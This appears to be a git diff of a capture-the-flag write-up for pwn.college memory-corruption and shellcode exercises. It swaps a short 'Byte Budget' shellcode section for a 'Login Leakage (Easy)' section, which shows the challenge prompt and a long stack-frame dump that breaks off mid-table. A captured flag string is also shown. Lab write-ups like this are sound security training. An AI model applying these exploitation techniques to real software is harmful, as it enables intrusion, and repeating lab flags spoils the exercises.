@@ -576,27 +576,700 @@ Executing shellcode!
 pwn.college{ExWjiR3WDqi0KdvDkYToGHFiGhQ.0lMyIDL4ITM0EzW}
 ```
 
-## Byte Budget
+&nbsp;
 
-> Write and execute shellcode to read the flag, but you only get 18 bytes.
+## Login Leakage (Easy)
 
-```
-hacker@program-security~byte-budget:/$ /challenge/byte-budget 
-###
-### Welcome to /challenge/byte-budget!
-###
-
-This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
-as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
-practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
-other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
-
-Mapped 0x1000 bytes for shellcode at 0x2e0a9000!
-Reading 0x12 bytes from stdin.
-```
-
-This challenge limits our shell code to only 18 bytes.
+> Leverage memory corruption to satisfy a simple constraint
 
 ```
+hacker@program-security~login-leakage-easy:/$ /challenge/login-leakage-easy 
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffe0cc8fa10 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa18 (rsp+0x0008) | e8 12 c9 0c fe 7f 00 00 | 0x00007ffe0cc912e8 |
+| 0x00007ffe0cc8fa20 (rsp+0x0010) | d8 12 c9 0c fe 7f 00 00 | 0x00007ffe0cc912d8 |
+| 0x00007ffe0cc8fa28 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007ffe0cc8fa30 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa38 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa40 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa48 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa50 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa58 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa60 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa68 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa70 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa78 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa80 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa88 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa90 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fa98 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8faa0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8faa8 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fab0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fab8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fac0 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fac8 (rsp+0x00b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fad0 (rsp+0x00c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fad8 (rsp+0x00c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fae0 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fae8 (rsp+0x00d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8faf0 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8faf8 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb00 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb08 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb10 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb18 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb20 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb28 (rsp+0x0118) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb30 (rsp+0x0120) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb38 (rsp+0x0128) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb40 (rsp+0x0130) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb48 (rsp+0x0138) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb50 (rsp+0x0140) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb58 (rsp+0x0148) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb60 (rsp+0x0150) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb68 (rsp+0x0158) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb70 (rsp+0x0160) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb78 (rsp+0x0168) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb80 (rsp+0x0170) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb88 (rsp+0x0178) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb90 (rsp+0x0180) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fb98 (rsp+0x0188) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fba0 (rsp+0x0190) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fba8 (rsp+0x0198) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fbb0 (rsp+0x01a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fbb8 (rsp+0x01a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fbc0 (rsp+0x01b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fbc8 (rsp+0x01b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fbd0 (rsp+0x01c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fbd8 (rsp+0x01c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fbe0 (rsp+0x01d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fbe8 (rsp+0x01d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fbf0 (rsp+0x01e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fbf8 (rsp+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc00 (rsp+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc08 (rsp+0x01f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc10 (rsp+0x0200) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc18 (rsp+0x0208) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc20 (rsp+0x0210) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc28 (rsp+0x0218) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc30 (rsp+0x0220) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc38 (rsp+0x0228) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc40 (rsp+0x0230) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc48 (rsp+0x0238) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc50 (rsp+0x0240) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc58 (rsp+0x0248) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc60 (rsp+0x0250) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc68 (rsp+0x0258) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc70 (rsp+0x0260) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc78 (rsp+0x0268) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc80 (rsp+0x0270) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc88 (rsp+0x0278) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc90 (rsp+0x0280) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fc98 (rsp+0x0288) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fca0 (rsp+0x0290) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fca8 (rsp+0x0298) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fcb0 (rsp+0x02a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fcb8 (rsp+0x02a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fcc0 (rsp+0x02b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fcc8 (rsp+0x02b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fcd0 (rsp+0x02c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fcd8 (rsp+0x02c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fce0 (rsp+0x02d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fce8 (rsp+0x02d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fcf0 (rsp+0x02e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fcf8 (rsp+0x02e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd00 (rsp+0x02f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd08 (rsp+0x02f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd10 (rsp+0x0300) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd18 (rsp+0x0308) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd20 (rsp+0x0310) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd28 (rsp+0x0318) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd30 (rsp+0x0320) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd38 (rsp+0x0328) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd40 (rsp+0x0330) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd48 (rsp+0x0338) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd50 (rsp+0x0340) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd58 (rsp+0x0348) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd60 (rsp+0x0350) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd68 (rsp+0x0358) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd70 (rsp+0x0360) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd78 (rsp+0x0368) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd80 (rsp+0x0370) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd88 (rsp+0x0378) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd90 (rsp+0x0380) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fd98 (rsp+0x0388) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fda0 (rsp+0x0390) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fda8 (rsp+0x0398) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fdb0 (rsp+0x03a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fdb8 (rsp+0x03a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fdc0 (rsp+0x03b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fdc8 (rsp+0x03b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fdd0 (rsp+0x03c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fdd8 (rsp+0x03c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fde0 (rsp+0x03d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fde8 (rsp+0x03d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fdf0 (rsp+0x03e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fdf8 (rsp+0x03e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe00 (rsp+0x03f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe08 (rsp+0x03f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe10 (rsp+0x0400) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe18 (rsp+0x0408) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe20 (rsp+0x0410) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe28 (rsp+0x0418) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe30 (rsp+0x0420) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe38 (rsp+0x0428) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe40 (rsp+0x0430) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe48 (rsp+0x0438) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe50 (rsp+0x0440) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe58 (rsp+0x0448) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe60 (rsp+0x0450) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe68 (rsp+0x0458) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe70 (rsp+0x0460) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe78 (rsp+0x0468) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe80 (rsp+0x0470) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe88 (rsp+0x0478) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe90 (rsp+0x0480) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fe98 (rsp+0x0488) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fea0 (rsp+0x0490) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fea8 (rsp+0x0498) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8feb0 (rsp+0x04a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8feb8 (rsp+0x04a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fec0 (rsp+0x04b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fec8 (rsp+0x04b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fed0 (rsp+0x04c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fed8 (rsp+0x04c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fee0 (rsp+0x04d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fee8 (rsp+0x04d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fef0 (rsp+0x04e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fef8 (rsp+0x04e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff00 (rsp+0x04f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff08 (rsp+0x04f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff10 (rsp+0x0500) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff18 (rsp+0x0508) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff20 (rsp+0x0510) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff28 (rsp+0x0518) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff30 (rsp+0x0520) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff38 (rsp+0x0528) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff40 (rsp+0x0530) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff48 (rsp+0x0538) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff50 (rsp+0x0540) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff58 (rsp+0x0548) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff60 (rsp+0x0550) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff68 (rsp+0x0558) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff70 (rsp+0x0560) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff78 (rsp+0x0568) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff80 (rsp+0x0570) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff88 (rsp+0x0578) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff90 (rsp+0x0580) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ff98 (rsp+0x0588) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ffa0 (rsp+0x0590) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ffa8 (rsp+0x0598) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ffb0 (rsp+0x05a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ffb8 (rsp+0x05a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ffc0 (rsp+0x05b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ffc8 (rsp+0x05b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ffd0 (rsp+0x05c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ffd8 (rsp+0x05c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ffe0 (rsp+0x05d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8ffe8 (rsp+0x05d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fff0 (rsp+0x05e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc8fff8 (rsp+0x05e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90000 (rsp+0x05f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90008 (rsp+0x05f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90010 (rsp+0x0600) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90018 (rsp+0x0608) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90020 (rsp+0x0610) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90028 (rsp+0x0618) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90030 (rsp+0x0620) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90038 (rsp+0x0628) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90040 (rsp+0x0630) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90048 (rsp+0x0638) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90050 (rsp+0x0640) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90058 (rsp+0x0648) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90060 (rsp+0x0650) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90068 (rsp+0x0658) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90070 (rsp+0x0660) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90078 (rsp+0x0668) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90080 (rsp+0x0670) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90088 (rsp+0x0678) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90090 (rsp+0x0680) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90098 (rsp+0x0688) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900a0 (rsp+0x0690) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900a8 (rsp+0x0698) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900b0 (rsp+0x06a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900b8 (rsp+0x06a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900c0 (rsp+0x06b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900c8 (rsp+0x06b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900d0 (rsp+0x06c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900d8 (rsp+0x06c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900e0 (rsp+0x06d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900e8 (rsp+0x06d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900f0 (rsp+0x06e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc900f8 (rsp+0x06e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90100 (rsp+0x06f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90108 (rsp+0x06f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90110 (rsp+0x0700) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90118 (rsp+0x0708) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90120 (rsp+0x0710) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90128 (rsp+0x0718) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90130 (rsp+0x0720) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90138 (rsp+0x0728) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90140 (rsp+0x0730) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90148 (rsp+0x0738) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90150 (rsp+0x0740) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90158 (rsp+0x0748) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90160 (rsp+0x0750) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90168 (rsp+0x0758) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90170 (rsp+0x0760) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90178 (rsp+0x0768) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90180 (rsp+0x0770) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90188 (rsp+0x0778) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe0cc90190 (rsp+0x0780) | 00 00 00 00 00 00 d9 18 | 0x18d9000000000000 |
+| 0x00007ffe0cc90198 (rsp+0x0788) | f3 27 ee 25 5f 78 00 00 | 0x0000785f25ee27f3 |
+| 0x00007ffe0cc901a0 (rsp+0x0790) | 00 d2 e7 9b cf 5c 00 00 | 0x00005ccf9be7d200 |
